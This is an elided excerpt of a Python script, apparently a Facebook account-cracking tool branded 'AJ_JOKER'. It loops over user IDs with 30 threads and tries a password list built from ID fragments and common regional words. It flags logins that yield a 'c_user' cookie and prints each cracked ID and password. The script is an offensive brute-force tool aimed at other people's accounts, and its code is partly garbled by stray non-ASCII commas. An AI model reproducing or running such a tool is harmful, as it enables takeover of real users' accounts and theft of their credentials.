...
\033[1;32m║AUTHOR    : LOVE AJ_JOKER          ║║       \x1b[1;91m|__-__|\033[1;32m        ║
...
def sex1():
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        for guru in user:
            ...
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh','iloveyou','AFGHAN1234','AFGHAN','afghanistanjan','۱۲۳۴۵۶','۱۱۱۲۲۲'،'12345678','Khanoo','lovekhanoo','Arman','Armanjan'،'۵٠٠۶٠٠','۱٠٠٠۲٠٠٠','Aramankhan']
...
def uff1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mAJ_JOKER\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[AJ_JOKER -OK] {uid} | {ps}")
